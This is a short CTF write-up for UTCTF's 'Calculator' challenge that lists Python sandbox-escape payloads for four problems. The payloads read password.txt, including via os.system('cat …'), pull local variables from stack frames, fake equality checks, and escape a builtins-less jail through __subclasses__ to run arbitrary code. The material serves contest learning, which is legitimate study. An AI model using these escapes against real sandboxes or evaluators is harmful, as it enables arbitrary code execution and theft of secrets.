
# Calculator
* **Event:** UTCTF
* **Problem Type:** Misc (moved to Web)
* **Point Value / Difficulty:** Medium


This is just solutions so far; at some point I'll write a better writeup.

Some useful tools for escaping pyjails, that someone linked during the CTF:  
https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes

# Problem 0

Solutions:  
input: `solution`  
input: `password`

Any of the solutions for later problems should work for this one.

# Problem 1

Solutions:
```py
__import__('io').open('password.txt').read()
__import__('builtins').open('password.txt').read()
__import__('os').system('cat password.txt')
```

Any of the solutions for later problems should work for this one.


# Problem 2

Originally intended solutions:
```py
[frame.frame.f_locals.get("password") for frame in __import__("inspect").stack()]
[frame.frame.f_locals for frame in __import__("inspect").stack() if not ("<" in frame.filename or "/usr/lib" in frame.filename)]

__import__('sys')._getframe(1).f_locals["password"]  # May have to adjust the stack depth
```

Other solutions people came up with:
```py
__import__("__main__").password                  # Uh, whoops... (this wasn't an intended solution, but it's creative)
type('A', (), {'__eq__': lambda x,y: True})()    # Make a class that always returns true to comparisons
__import__('importlib').import_module('unittest.mock').ANY   # Same as above, using a library
```

Some people used `__import__('random').getstate()` and rolled back the random state to get the answer --
it's really interesting, but I have no clue how to actually implement that.

# Problem 3

This one requires escaping a python jail without builtins; it's a reasonably well documented
problem, with a variety of different solutions.  I like these ones because they're more general
and not specific to the problem itself (ie. it's easy to run arbitrary code):

Solutions:
```py
(lambda cls=(lambda n:[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__==n][0]):
    lambda __builtins__=(cls("catch_warnings")()._module.__builtins__):
        [frame.frame.f_locals.get("password") for frame in __builtins__["__import__"]("inspect").stack()]
)()()

(lambda b=((lambda n:[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__==n][0])("catch_warnings")()._module.__builtins__):
    b["eval"]("""[frame.frame.f_locals.get("password") for frame in __import__("inspect").stack()]""", {"__builtins__": b})
)()
```


